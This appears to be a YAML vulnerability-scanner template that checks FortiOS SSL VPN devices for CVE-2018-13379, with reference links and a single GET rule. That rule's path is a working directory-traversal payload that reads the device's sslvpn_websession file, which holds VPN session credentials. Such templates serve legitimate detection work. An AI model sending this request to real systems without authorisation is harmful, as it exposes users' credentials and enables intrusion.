name: yaml-poc-fortinet-fortios-directory_traversal-CVE-2018-13379
binding: b202af6b-a8df-4a9c-8a3d-e50b30fd4675
detail:
    author: system_user
    links:
        - https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/
        - https://fortiguard.com/advisory/FG-IR-18-384
        - https://fortiguard.com/psirt/FG-IR-18-384
        - https://github.com/blacklotuslabs/Development/blob/master/Mitigations/CVE/CVE-2018-13379/CVE-2018-13379%20-%20Summary%20%26%20Emergency%20Mitigations.pdf
        - https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf
        - https://nvd.nist.gov/vuln/detail/CVE-2018-13379
        - https://packetstormsecurity.com/files/154146/FortiOS-5.6.7-6.0.4-Credential-Disclosure.html
        - https://packetstormsecurity.com/files/154147/FortiOS-5.6.7-6.0.4-Credential-Disclosure.html
        - https://vigilance.fr/vulnerability/FortiOS-directory-traversal-via-SSL-VPN-29414
        - https://www.auscert.org.au/bulletins/ESB-2021.1889
        - https://www.cybersecurity-help.cz/vdb/SB2021060121
        - https://www.exploit-db.com/exploits/47288
        - https://www.fortiguard.com/psirt/FG-IR-20-233
        - https://www.fortinet.com/products/fortigate/fortios.html
        - https://www.securityfocus.com/bid/108693
    vulnerability:
        id: 8704843f-547c-4270-aa5f-451d945ec92d
        level: critical
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
            headers:
                Content-Type: application/x-www-form-urlencoded
            follow_redirects: true
        expression: response.body.bcontains(bytes("fgt_lang")) && response.body.bcontains(bytes("Forticlient"))
expression: r0()
